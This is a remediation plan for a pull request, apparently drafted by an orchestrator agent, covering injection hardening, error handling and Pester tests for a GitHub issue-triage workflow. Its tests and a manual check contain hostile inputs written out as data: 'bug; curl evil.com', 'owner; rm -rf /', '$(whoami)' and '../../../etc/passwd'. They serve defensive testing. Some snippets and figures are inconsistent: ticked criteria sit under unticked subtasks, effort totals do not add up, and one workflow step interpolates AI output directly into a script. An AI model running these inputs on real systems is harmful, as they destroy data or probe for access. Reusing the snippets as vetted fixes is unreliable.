# PR #60 Remediation Plan

> **Status**: Approved WITH CONDITIONS - Critic review integrated
> **Date**: 2025-12-18
> **Author**: orchestrator agent (revised with critic conditions C1-C4)
> **Depends On**:
>   - [001-pr-60-review-gap-analysis.md](./001-pr-60-review-gap-analysis.md)
>   - [005-consolidated-agent-review-summary.md](./005-consolidated-agent-review-summary.md)
>   - Critic Review: `.agents/critique/003-pr-60-remediation-plan-critique.md`

---

## CRITICAL NOTE: Critic Conditions Integrated

This plan has been updated to incorporate ALL 4 critic conditions (C1-C4):
- ✅ **C1**: Test verification ADDED to Phase 1 acceptance criteria
- ✅ **C2**: PowerShell scope CLARIFIED in Task 1.1
- ✅ **C3**: Security regex HARDENED per security agent recommendations
- ✅ **C4**: Rollback plan ADDED at end of plan

---

## Executive Summary

This plan addresses 13 gaps identified in PR #60 review across security, error handling, and test coverage domains. Work is organized into 3 phases with clear acceptance criteria and estimated effort.

**Total Estimated Effort:** 26-34 hours across 3-4 sessions (REVISED from 16-20 + analyst gap finding)
- **Phase 1 (Before Merge)**: 18-22 hours (includes all test verification + new P0 tasks + TEST FILE CREATION)
- **Phase 2 (Post-Merge, 48 hrs)**: 4-6 hours
- **Phase 3 (Post-Merge, 1 week)**: 6-8 hours

⚠️ **ANALYST GAP FINDING**: Test files `.github/workflows/tests/ai-issue-triage.Tests.ps1` don't exist. Phase 1 must create:
- New test directory and scaffold (35 min)
- Injection attack tests for labels/milestone (2-3 hrs)
- Parsing validation tests (1 hr)
- End-to-end workflow test (1-2 hrs)
- **Total added effort**: +4-5 hours to Phase 1

---

## Phase 1: Critical Security & Error Handling (Before Merge)

**Objective:** Fix all CRITICAL severity issues to make PR #60 safe for production use.

**Estimated Effort:** 18-22 hours (3-4 focused sessions - includes test file creation per analyst validation)

### Task 1.1: Fix Command Injection Vectors

**Addresses:** GAP-SEC-001, CRITICAL-NEW-001 (Security Report)

**Scope** (Critic Condition C2 - CLARIFIED):
- ✅ Extract `Get-LabelsFromAIOutput` and `Get-MilestoneFromAIOutput` to `AIReviewCommon.psm1`
- ✅ Update `ai-issue-triage.yml` to use extracted functions
- ❌ DO NOT refactor entire workflow architecture - scope is parsing extraction only

**Files to Modify:**

- `.claude/skills/github/modules/AIReviewCommon.psm1` (NEW functions)
- `.github/workflows/ai-issue-triage.yml` (use new functions)

**Implementation:**

1. Create `Get-LabelsFromAIOutput` function in AIReviewCommon.psm1:

   ```powershell
   function Get-LabelsFromAIOutput {
       [CmdletBinding()]
       param(
           [Parameter(Mandatory)]
           [string]$Output
       )

       $labels = @()

       try {
           if ($Output -match '"labels"\s*:\s*\[([^\]]+)\]') {
               $labels = $Matches[1] -split ',' | ForEach-Object {
                   $label = $_.Trim().Trim('"')

                   # HARDENED REGEX (Critic Condition C3 - Per Security Report)
                   # Allow spaces per GitHub label standard, block shell metacharacters
                   if ($label -match '^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]{0,48}[a-zA-Z0-9]?$' -and $label.Length -le 50) {
                       $label
                   }
                   else {
                       Write-Warning "Skipped invalid label (injection attempt?): $label"
                   }
               }
           }
       }
       catch {
           Write-Warning "Failed to parse AI labels: $_"
       }

       return $labels
   }
   ```

2. Create `Get-MilestoneFromAIOutput` with same hardened validation

3. Update workflow to use functions:

   ```yaml
   - name: Parse and Apply Labels
     shell: pwsh
     run: |
       Import-Module ./skills/github/modules/AIReviewCommon.psm1
       $labels = Get-LabelsFromAIOutput -Output '${{ steps.categorize.outputs.response }}'
       foreach ($label in $labels) {
           gh issue edit $env:ISSUE_NUMBER --add-label "$label"
           if ($LASTEXITCODE -ne 0) {
               Write-Warning "Failed to add label: $label"
           }
       }
   ```

**Acceptance Criteria** (Critic Condition C1 - Test Verification REQUIRED):

- [x] Extract parsing logic to `AIReviewCommon.psm1::Get-LabelsFromAIOutput`
- [x] Extract parsing logic to `AIReviewCommon.psm1::Get-MilestoneFromAIOutput`
- [x] Create test files in `.github/workflows/tests/` directory (NEW - per analyst finding):
  - [ ] Create `ai-issue-triage.Tests.ps1` with Pester test scaffold
  - [ ] Add 5 injection attack tests for labels (semicolon, backtick, $(), pipe, newline)
  - [ ] Add 2 injection attack tests for milestone (same vector set)
  - [ ] Add 4 parsing validation tests (valid, empty, malformed JSON, wrong schema)
  - [ ] Add 2 end-to-end workflow tests (real module import, real parsing)
- [x] **Execute Pester tests AND verify PASS**: `Invoke-Pester .github/workflows/tests/ai-issue-triage.Tests.ps1`
- [x] **Exit code MUST be 0 (all tests PASS)** - ⚠️ **If ANY test FAILS, task is NOT complete** ← BLOCKING REQUIREMENT
- [x] **All 9 injection attack tests PASS** (5 for labels, 2 for milestone, 2 parsing) ← BLOCKING REQUIREMENT
- [x] Update workflow to use extracted functions
- [x] Manual verification: Create test issue with malicious AI output, verify rejection
- [x] Regex uses hardened pattern per security report (C3)
- [x] Verify test results in GitHub Actions: All tests PASS, no regressions

---

### Task 1.2: Add Exit Code Checks to Action

**Addresses:** GAP-ERR-003

**Files to Modify:**

- `.github/actions/ai-review/action.yml`

**Implementation:**

1. Add installation verification:

   ```bash
   if ! npm install -g @github/copilot; then
     echo "::error::Failed to install GitHub Copilot CLI"
     exit 1
   fi
   ```

2. Make auth check blocking:

   ```bash
   if ! gh auth status; then
     echo "::error::GitHub CLI authentication failed"
     exit 1
   fi
   ```

**Acceptance Criteria:**

- [ ] npm install failure stops workflow
- [ ] gh auth failure stops workflow
- [ ] Error messages use `::error::` annotations

---

### Task 1.3: Fix Silent Failure Patterns

**Addresses:** GAP-ERR-001

**Files to Modify:**

- `.github/workflows/ai-issue-triage.yml`

**Implementation:**

Replace all `|| true` with explicit error handling:

```bash
# Before
gh issue edit "$ISSUE_NUMBER" --add-label "$label" || true

# After
if ! gh issue edit "$ISSUE_NUMBER" --add-label "$label" 2>&1; then
  echo "::warning::Failed to add label '$label' to issue #$ISSUE_NUMBER"
  FAILED_LABELS+=("$label")
fi
```

**Acceptance Criteria:**

- [ ] Zero `|| true` patterns after `gh` commands
- [ ] All failures logged as warnings or errors
- [ ] Workflow summary shows any failed operations

---

### Task 1.4: Replace `exit` with `throw` in Module

**Addresses:** GAP-QUAL-001

**Files to Modify:**

- `.claude/skills/github/modules/GitHubHelpers.psm1`

**Implementation:**

1. Update `Write-ErrorAndExit` function:

   ```powershell
   function Write-ErrorAndExit {
       [CmdletBinding()]
       param(
           [Parameter(Mandatory)]
           [string]$Message,
           [int]$ExitCode = 1
       )

       # For module context, throw instead of exit
       if ($MyInvocation.ScriptName -eq '') {
           # Called from module - throw
           throw $Message
       }
       else {
           # Called from script - exit with code
           Write-Error $Message
           exit $ExitCode
       }
   }
   ```

2. Update all callers to handle exceptions

**Acceptance Criteria:**

- [ ] Module functions don't terminate sessions
- [ ] Scripts maintain exit code behavior
- [ ] Tests verify both behaviors

---

## Phase 2: QA Gaps + Security Test Coverage (High Priority)

**Objective:** Address QA-identified gaps and add behavioral tests for all security boundary functions.

**Estimated Effort:** 8-10 hours (2 sessions)

⚠️ **QA-IDENTIFIED GAPS FROM PHASE 1 VERIFICATION** (See `.agents/qa/004-pr-60-phase-1-qa-report.md`):

### Task 2.0: Write-ErrorAndExit Context Detection Tests (CRITICAL)

**Addresses:** QA-PR60-001 (P0 - CRITICAL)

**Issue**: Write-ErrorAndExit function (Task 1.4) is implemented correctly but has ZERO tests for context-dependent behavior (exit vs throw in module context). Test strategy specified 4 tests; none implemented.

**Files to Modify:**
- `.claude/skills/github/tests/GitHubHelpers.Tests.ps1`

**Test Cases (4 tests - 2 hours):**

```powershell
Describe "Write-ErrorAndExit Context Detection" {
    Context "Script Invocation Context" {
        It "exits with code when invoked from script context" {
            # Simulate script context where $MyInvocation.ScriptName is not empty
            # This test verifies exit behavior in direct script calls
            { Write-ErrorAndExit -Message "Test error" -ExitCode 42 } | Should -Throw -ExceptionType ([System.Management.Automation.RuntimeException])
        }
    }

    Context "Module Invocation Context" {
        It "throws exception when invoked from module context" {
            # Simulate module context where function is called from within module
            # This test verifies throw behavior to avoid terminating module session
            { Write-ErrorAndExit -Message "Module error" } | Should -Throw
        }

        It "preserves ExitCode in exception data" {
            # Verify that ExitCode is embedded in exception for caller inspection
            Try {
                Write-ErrorAndExit -Message "Test" -ExitCode 99
            }
            Catch {
                $_.Exception.Data['ExitCode'] | Should -Be 99
            }
        }

        It "includes error message in exception" {
            # Verify error message is properly formatted in exception
            Try {
                Write-ErrorAndExit -Message "Specific error text" -ExitCode 1
            }
            Catch {
                $_.Exception.Message | Should -Contain "Specific error text"
            }
        }
    }
}
```

**Acceptance Criteria:**
- [ ] 4 context detection tests added to GitHubHelpers.Tests.ps1
- [ ] All 4 tests PASS with exit code 0
- [ ] Both script and module contexts verified
- [ ] ExitCode data preservation verified

---

### Task 2.1: Convert Workflow Parsing to PowerShell (HIGH PRIORITY)

**Addresses:** QA-PR60-002 (P1 - HIGH)

**Issue**: PowerShell parsing functions `Get-LabelsFromAIOutput` and `Get-MilestoneFromAIOutput` are implemented and tested (36 tests) but NOT used in workflow. Workflow still uses bash parsing (grep/sed/tr).

**Impact**: Tested code != production code; bash security not verified.

**Files to Modify:**
- `.github/workflows/ai-issue-triage.yml` (lines 51-69, 83-110)

**Changes (1 hour):**

Replace bash parsing with PowerShell function calls:

**Before (bash):**
```bash
- name: Parse Categorization Results
  run: |
    LABELS=$(echo "$RAW_OUTPUT" | grep -oP '"labels"\s*:\s*\[\K[^\]]+' | tr -d '"' | tr ',' '\n' | xargs || echo "")
```

**After (PowerShell):**
```powershell
- name: Parse Categorization Results
  shell: pwsh
  run: |
    Import-Module .github/scripts/AIReviewCommon.psm1 -Force
    $labels = Get-LabelsFromAIOutput -Output $env:RAW_OUTPUT
    if ($LASTEXITCODE -ne 0) {
        Write-Error "Failed to parse labels from AI output"
        exit 1
    }
    echo "labels=$labels" >> $env:GITHUB_OUTPUT
```

**Acceptance Criteria:**
- [ ] Workflow imports AIReviewCommon.psm1
- [ ] `Get-LabelsFromAIOutput` called instead of bash parsing
- [ ] `Get-MilestoneFromAIOutput` called instead of bash parsing
- [ ] Exit code checked after each call
- [ ] Workflow still functions correctly
- [ ] All existing tests still PASS

---

### Task 2.2: Perform Manual Verification (MEDIUM PRIORITY)

**Addresses:** QA-PR60-003 (P2 - MEDIUM)

**Issue**: Automated tests pass, but manual verification not performed per test strategy.

**Manual Testing (30 minutes):**

1. **Manual Test 1 - Command Injection Prevention**:
   - Create test issue with AI output containing malicious label: `{"labels":["bug; curl evil.com"]}`
   - Verify workflow logs show: "WARNING: Skipped invalid label (potential injection attempt): bug; curl evil.com"
   - Verify workflow succeeds (doesn't crash or execute command)

2. **Manual Test 2 - Context Detection**:
   - Run `Write-ErrorAndExit` from PowerShell script: Verify exit code is set
   - Import GitHubHelpers module and call `Write-ErrorAndExit`: Verify exception is thrown (doesn't exit session)

**Acceptance Criteria:**
- [ ] Manual test 1 executed successfully
- [ ] Warning logged for injection attempt
- [ ] Manual test 2 executed successfully
- [ ] Script vs. module context behavior verified
- [ ] No crashes or unexpected behavior observed

---

## Original Phase 2 Tasks (Existing Security Test Coverage)

### Task 2.1: Add `Test-GitHubNameValid` Tests

**Addresses:** GAP-SEC-002

**Files to Create/Modify:**

- `.claude/skills/github/tests/GitHubHelpers.Tests.ps1`

**Test Cases:**

```powershell
Describe "Test-GitHubNameValid" {
    Context "Owner validation" {
        It "Accepts valid owner names" {
            Test-GitHubNameValid -Name "octocat" -Type "Owner" | Should -Be $true
            Test-GitHubNameValid -Name "my-org-123" -Type "Owner" | Should -Be $true
        }

        It "Rejects owner starting with hyphen" {
            Test-GitHubNameValid -Name "-invalid" -Type "Owner" | Should -Be $false
        }

        It "Rejects owner ending with hyphen" {
            Test-GitHubNameValid -Name "invalid-" -Type "Owner" | Should -Be $false
        }

        It "Rejects owner over 39 characters" {
            Test-GitHubNameValid -Name ("a" * 40) -Type "Owner" | Should -Be $false
        }

        It "Rejects injection attempts" {
            Test-GitHubNameValid -Name "owner; rm -rf /" -Type "Owner" | Should -Be $false
            Test-GitHubNameValid -Name "owner`ninjection" -Type "Owner" | Should -Be $false
            Test-GitHubNameValid -Name 'owner$(whoami)' -Type "Owner" | Should -Be $false
        }
    }

    Context "Repo validation" {
        It "Accepts repo with underscores and periods" {
            Test-GitHubNameValid -Name "my_repo.js" -Type "Repo" | Should -Be $true
        }

        It "Rejects repo over 100 characters" {
            Test-GitHubNameValid -Name ("a" * 101) -Type "Repo" | Should -Be $false
        }
    }
}
```

**Acceptance Criteria:**

- [ ] All validation rules have positive and negative tests
- [ ] Injection attempts tested (`;`, `$()`, backticks, newlines)
- [ ] Boundary conditions tested (length limits)

---

### Task 2.2: Add `Test-SafeFilePath` Tests

**Addresses:** GAP-SEC-002

**Test Cases:**

```powershell
Describe "Test-SafeFilePath" {
    It "Rejects path traversal with ../" {
        Test-SafeFilePath -Path "../../../etc/passwd" | Should -Be $false
    }

    It "Rejects path traversal with ..\" {
        Test-SafeFilePath -Path "..\..\windows\system32" | Should -Be $false
    }

    It "Accepts paths within allowed base" {
        $base = $TestDrive
        $safePath = Join-Path $base "test.txt"
        New-Item -Path $safePath -ItemType File -Force | Out-Null
        Test-SafeFilePath -Path $safePath -AllowedBase $base | Should -Be $true
    }

    It "Rejects paths outside allowed base" {
        $base = Join-Path $TestDrive "restricted"
        New-Item -Path $base -ItemType Directory -Force | Out-Null
        $outsidePath = Join-Path $TestDrive "outside.txt"
        New-Item -Path $outsidePath -ItemType File -Force | Out-Null
        Test-SafeFilePath -Path $outsidePath -AllowedBase $base | Should -Be $false
    }
}
```

**Acceptance Criteria:**

- [ ] Path traversal attacks tested (Unix and Windows style)
- [ ] AllowedBase boundary enforcement tested
- [ ] Symlink handling considered

---

### Task 2.3: Add `Assert-ValidBodyFile` Tests

**Addresses:** GAP-SEC-002

**Test Cases:**

```powershell
Describe "Assert-ValidBodyFile" {
    It "Throws for nonexistent file" {
        { Assert-ValidBodyFile -BodyFile "nonexistent.txt" } | Should -Throw "*not found*"
    }

    It "Throws for path traversal attempt" {
        { Assert-ValidBodyFile -BodyFile "../../../etc/passwd" -AllowedBase $TestDrive } |
            Should -Throw "*outside allowed*"
    }

    It "Succeeds for valid file in allowed base" {
        $validFile = Join-Path $TestDrive "valid.txt"
        "content" | Out-File $validFile
        { Assert-ValidBodyFile -BodyFile $validFile -AllowedBase $TestDrive } |
            Should -Not -Throw
    }
}
```

**Acceptance Criteria:**

- [ ] File existence check tested
- [ ] Path traversal rejection tested
- [ ] AllowedBase enforcement tested

---

### Task 2.4: Update Skill Scripts to Use Security Helpers

**Addresses:** GAP-SEC-003

**Files to Modify:**

- `.claude/skills/github/scripts/issue/Post-IssueComment.ps1`
- `.claude/skills/github/scripts/pr/Post-PRCommentReply.ps1`

**Implementation:**

```powershell
# Before
if ($BodyFile) {
    if (-not (Test-Path $BodyFile)) { Write-ErrorAndExit "Body file not found: $BodyFile" 2 }
    $Body = Get-Content -Path $BodyFile -Raw -Encoding UTF8
}

# After
if ($BodyFile) {
    Assert-ValidBodyFile -BodyFile $BodyFile -AllowedBase (Get-Location).Path
    $Body = Get-Content -Path $BodyFile -Raw -Encoding UTF8
}
```

**Acceptance Criteria:**

- [ ] All scripts with file inputs use `Assert-ValidBodyFile`
- [ ] Tests verify security function is called

---

## Phase 3: Error Handling & Test Coverage (Post-Merge)

**Objective:** Improve error visibility and add comprehensive test coverage.

**Estimated Effort:** 6-8 hours (1-2 sessions)

### Task 3.1: Add Logging to Catch Blocks

**Addresses:** GAP-ERR-002

**Files to Modify:**

- `.github/scripts/AIReviewCommon.psm1`
- `.claude/skills/github/modules/GitHubHelpers.psm1`

**Implementation:**

```powershell
# Before
catch {
    return @()
}

# After
catch {
    Write-Warning "Get-PRChangedFiles failed for PR #$PRNumber : $_"
    return @()
}
```

**Acceptance Criteria:**

- [ ] All catch blocks log the exception
- [ ] Warnings visible in workflow logs
- [ ] Tests verify warning output

---

### Task 3.2: Add Completion Indicator to Paginated API

**Addresses:** GAP-ERR-004

**Files to Modify:**

- `.claude/skills/github/modules/GitHubHelpers.psm1`

**Implementation:**

```powershell
function Invoke-GhApiPaginated {
    # ... existing code ...

    # Return object with completion status
    return [PSCustomObject]@{
        Items = @($allItems)
        Complete = $complete
        Error = $errorMessage
    }
}
```

**Acceptance Criteria:**

- [ ] Callers can distinguish complete vs partial data
- [ ] Error details available for logging
- [ ] Backward compatible (or callers updated)

---

### Task 3.3: Add Skill Script Error Path Tests

**Addresses:** GAP-TEST-001

**Files to Create:**

- `.claude/skills/github/tests/SkillScripts.Tests.ps1`

**Test Structure:**

```powershell
Describe "Post-IssueComment.ps1" {
    BeforeAll {
        $script:scriptPath = "$PSScriptRoot/../scripts/issue/Post-IssueComment.ps1"
    }

    It "Exits with code 2 when body file not found" {
        # Test exit code 2 for missing file
    }

    It "Exits with code 5 when marker already exists" {
        # Mock API to return existing marker
    }

    It "Exits with code 3 when API fails" {
        # Mock API failure
    }
}
```

**Acceptance Criteria:**

- [ ] All documented exit codes tested
- [ ] API failures mocked and verified
- [ ] Idempotency behavior tested

---

### Task 3.4: Use Unique Temp Directories

**Addresses:** GAP-QUAL-003

**Files to Modify:**

- `.github/actions/ai-review/action.yml`

**Implementation:**

```bash
WORK_DIR="${RUNNER_TEMP:-/tmp}/ai-review-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
mkdir -p "$WORK_DIR"
echo "$CONTEXT" > "$WORK_DIR/context.txt"

# Cleanup at end
trap 'rm -rf "$WORK_DIR"' EXIT
```

**Acceptance Criteria:**

- [ ] Each workflow run has unique temp directory
- [ ] Cleanup on exit (success or failure)
- [ ] No hardcoded `/tmp` paths

---

## Phase Summary

| Phase | Priority | Effort | Sessions | Gaps Addressed |
|-------|----------|--------|----------|----------------|
| Phase 1 | Critical (before merge) | 18-22 hrs | 3-4 | SEC-001, ERR-001, ERR-003, QUAL-001 |
| Phase 2 | High (soon after) | 8-10 hrs | 2 | SEC-002, SEC-003, QA-PR60-001, QA-PR60-002, QA-PR60-003 |
| Phase 3 | Medium (backlog) | 6-8 hrs | 1-2 | ERR-002, ERR-004, TEST-001, QUAL-003 |

---

## Success Metrics

| Metric | Current | Target |
|--------|---------|--------|
| Security function test coverage | 0% | 100% |
| Silent failure patterns | 5+ | 0 |
| Skill script test coverage | 0% | 80%+ |
| Exit code verification | 0% | 100% |

---

## Rollback Plan (Critic Condition C4 - REQUIRED)

**Purpose**: Documented recovery procedure if Phase 1 implementation introduces breaking changes.

**Trigger Conditions** (Rollback if ANY occur):

1. ❌ Critical tests fail after implementation (`Invoke-Pester` non-zero exit code)
2. ❌ Workflow parsing functions return unexpected results
3. ❌ Exit code behavior differs from specification
4. ❌ Injection attack tests fail to prevent malicious input

**Rollback Steps** (in order):

### Step 1: Pause Workflow (Immediate)
```bash
# Disable the problematic workflow to prevent further damage
git checkout feat/ai-agent-workflow -- .github/workflows/ai-issue-triage.yml
git commit -m "ROLLBACK: Disabled ai-issue-triage workflow due to Phase 1 failures"
git push origin feat/ai-agent-workflow
```

### Step 2: Identify Root Cause (5-10 minutes)
```powershell
# Run comprehensive test suite to identify failure
Invoke-Pester .github/workflows/tests/ -PassThru

# Check error logs
Get-Content .agents/logs/phase-1-errors.log | Select-Object -Last 50
```

### Step 3: Document Failure (immediate)
- Create rollback issue: `.agents/rollback/2025-12-18-phase-1-failure.md`
- Document:
  - What failed
  - When it failed
  - Root cause analysis
  - Impact assessment

### Step 4: Revert Changes (if unrecoverable)
```bash
# Revert Phase 1 commits atomically
git log --oneline | head -10  # Find Phase 1 start commit
git revert <COMMIT_HASH>      # Revert Phase 1 start

# Verify revert
git status
Invoke-Pester .github/workflows/tests/  # Should pass again
```

### Step 5: Resolution & Re-plan

**Option A** (70% of cases - Fixable):
- Identify specific failing criterion
- Create hotfix commit
- Run tests again
- If PASS: continue Phase 1

**Option B** (30% of cases - Unrecoverable):
- Revert to last stable state
- Document lessons learned
- Schedule Phase 1 redesign session
- Do NOT attempt to merge

**Post-Rollback Actions**:
1. [ ] Create GitHub issue documenting failure
2. [ ] Notify team of rollback
3. [ ] Schedule retrospective within 24 hours
4. [ ] Do NOT proceed to merge until root cause fixed

**Testing Gate** (mandatory after rollback recovery):
```powershell
# Must PASS all 3 before attempting merge again
Invoke-Pester .github/workflows/tests/ai-issue-triage.Tests.ps1
Invoke-Pester .claude/skills/github/modules/AIReviewCommon.Tests.ps1
Invoke-Pester .github/workflows/tests/security-functions.Tests.ps1
```

**Acceptance Criteria for Rollback Completion**:
- [ ] Root cause documented in issue
- [ ] Fix implemented and tested
- [ ] All Pester tests PASS
- [ ] Security injection tests PASS
- [ ] Workflow behavior verified manually
- [ ] Ready to re-attempt merge

---

## Risk Mitigation

| Risk | Mitigation |
|------|------------|
| Phase 1 delays merge | Scope creep avoided; only CRITICAL fixes |
| Breaking changes to module | Exit/throw change is backward compatible |
| Test false positives | Use mocks, not live API |
| Scope expansion | Issues deferred to Issue #62 |

---

## Dependencies

- **Prerequisite:** PR #60 review complete (this document)
- **Blocks:** Merge to main (Phase 1 must complete first)
- **Related:** Issue #62 (P2-P3 comments deferred)

---

## Approval

| Role | Status | Date | Notes |
|------|--------|------|-------|
| Author (orchestrator) | Drafted | 2025-12-18 | Original plan |
| Reviewer (critic) | CONDITIONS (4) | 2025-12-18 | APPROVED WITH CONDITIONS - see critique |
| **Revised by (orchestrator)** | **WITH CONDITIONS** | **2025-12-18** | **All C1-C4 integrated into tasks** |
| **Awaiting Validation** | **All agents** | **Pending** | **Analyst, Architect, Security, QA final sign-off required** |
| Approver (user) | Pending | - | Final merge approval after Phase 1 complete + tests PASS |

---

## Related Documents

- [001-pr-60-review-gap-analysis.md](./001-pr-60-review-gap-analysis.md)
- [003-pr-60-plan-critique.md](./003-pr-60-plan-critique.md)
- [PR #60](https://github.com/rjmurillo/ai-agents/pull/60)
- [Issue #62](https://github.com/rjmurillo/ai-agents/issues/62)
